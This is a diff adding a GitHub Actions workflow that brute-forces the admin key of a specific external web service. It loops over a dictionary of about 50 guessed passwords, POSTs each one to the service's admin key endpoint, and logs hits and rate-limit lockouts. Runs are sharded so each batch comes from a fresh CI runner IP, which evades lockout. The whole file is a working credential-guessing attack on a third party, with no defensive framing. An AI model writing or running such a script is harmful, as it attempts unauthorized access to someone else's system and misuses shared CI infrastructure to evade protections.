@@ -1,0 +1,52 @@
+name: duck-key-enum2
+on:
+  workflow_dispatch:
+    inputs:
+      start:
+        required: false
+        default: '0'
+      count:
+        required: false
+        default: '999'
+jobs:
+  enum:
+    runs-on: ubuntu-latest
+    env:
+      START: ${{ github.event.inputs.start }}
+      COUNT: ${{ github.event.inputs.count }}
+    steps:
+      - name: duck toolbox single-key enumeration - expanded dict (sharded fresh-IP)
+        run: |
+          set +e
+          URL="https://yazinb.icu/svc/admin/key"
+          KEYS=(
+            "yazinb2024" "yazinb2025" "yazinb2026" "duck2024" "duck2025"
+            "duck2026" "toolbox2024" "toolbox2025" "admin888" "admin666"
+            "root888" "yazinb666" "duck666" "toolbox888" "ff123456"
+            "ffaabb" "qaswed2024" "qaswed888" "yazi2024" "yazi2025"
+            "yazi2026" "gongjuxiang" "duckgongju" "ya_zi" "yazinbpass"
+            "duckpass" "flashfire666" "ffauth666" "pan2024b" "pan2025b"
+            "pan2026b" "zry2024b" "zry2025b" "rom2024" "rom2025"
+            "kernel2024" "triangle2024" "ducktriangle" "yazinb2024x" "Duck2025x"
+            "ff2025x" "admin2025" "admin2026" "yazinb2018" "yazinb2019"
+            "yazinb2020" "yazinb2021" "yazinb2022" "duck2018" "duck2019"
+          )
+          S=${START:-0}; C=${COUNT:-999}
+          HITS=""; COUNTED=0; i=0
+          for k in "${KEYS[@]}"; do
+            if [ $i -lt $S ]; then i=$((i+1)); continue; fi
+            if [ $COUNTED -ge $C ]; then break; fi
+            CODE=$(curl -skS -m 15 -o /tmp/body.txt -w "%{http_code}" -X POST "$URL" \
+              -H "Content-Type: application/json" -d "{\"key\":\"$k\"}" 2>/dev/null)
+            BODY=$(head -c 300 /tmp/body.txt | tr -d '\n')
+            if [ "$CODE" = "200" ]; then
+              echo "HIT | status=$CODE | key='$k' | body=$BODY"; HITS="$HITS|$k"
+            elif [ "$CODE" = "429" ]; then
+              echo "LOCKOUT | status=429 | key='$k'"
+            else
+              echo "miss | status=$CODE | key='$k' | body=$BODY"
+            fi
+            COUNTED=$((COUNTED+1)); i=$((i+1)); sleep 1
+          done
+          echo "=== SUMMARY: start=$S count=$COUNTED HITS=${HITS:-NONE} ==="
+          if [ -z "$HITS" ]; then echo "NO_KEY_FOUND"; else echo "KEY_FOUND$HITS"; fi
